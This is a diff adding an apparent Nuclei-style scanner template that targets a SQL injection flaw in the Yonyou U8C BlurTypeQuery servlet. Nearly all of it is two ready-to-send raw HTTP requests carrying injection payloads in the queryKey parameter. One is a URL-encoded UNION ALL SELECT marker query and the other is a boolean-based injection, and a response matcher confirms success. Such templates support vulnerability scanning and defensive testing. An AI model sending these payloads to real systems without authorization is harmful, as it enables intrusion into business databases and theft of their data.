@@ -1,0 +1,31 @@
+id: yongyou-u8c-BlurTypeQuery-sqli
+
+info:
+  name: yongyou-u8c-BlurTypeQuery-sqli
+  author: msk
+  severity: high
+
+
+http:
+  - raw:
+      - |
+        GET /servlet/~iufo/nc.itf.iufo.mobilereport.data.BlurTypeQuery?queryKey=1%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28113%29%2BISNULL%28CAST%28111%2A111%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28120%29%2BCHAR%28113%29%2CNULL%2CNULL%2CNULL--%20HoaZ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36
+        Connection: close
+        Accept-Encoding: gzip
+
+      - |
+        GET /servlet/~iufo/nc.itf.iufo.mobilereport.data.BlurTypeQuery?queryKey=1')or(1='c4ca4238a0b923820dcc509a6f75849b')--+ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36
+        Connection: close
+        Accept-Encoding: gzip
+
+
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"varchar")
